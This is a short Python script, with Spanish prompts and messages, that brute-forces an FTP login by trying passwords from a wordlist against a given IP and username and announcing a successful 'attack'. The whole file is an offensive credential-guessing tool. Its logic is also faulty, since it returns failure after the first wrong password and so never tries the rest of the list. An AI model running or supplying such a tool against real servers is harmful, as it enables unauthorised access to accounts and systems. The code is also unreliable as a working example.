import ftplib

def bruteForce_FTP(ip, user, password_file):
    with open(password_file, 'r') as passwords:
        for password in passwords :
            password = password.strip()
            print(f"[+] Probando la contraseña: {password}")
            try:
                ftp = ftplib.FTP(ip)
                ftp.login(user, password)
                print(f"[+] Contraseña encontrada: {password}")
                ftp.quit()
                return True
            except ftplib.error_perm as e:
                print(f"[-] Contraseña incorrecta: {password}") 
                return False
            
if __name__ == "__main__": 
    ip = input("Introduzca la ip deseeada")
    user = input("Introduzca el nombre de usuario")
    password_file = input("Introduzca la ruta al archivo con contraseñas: ")


if bruteForce_FTP(ip, user, password_file):
    print("Ataque realizado con exito!")
else: 
    print("Ataque fallido. No se encontró la contraseña")
        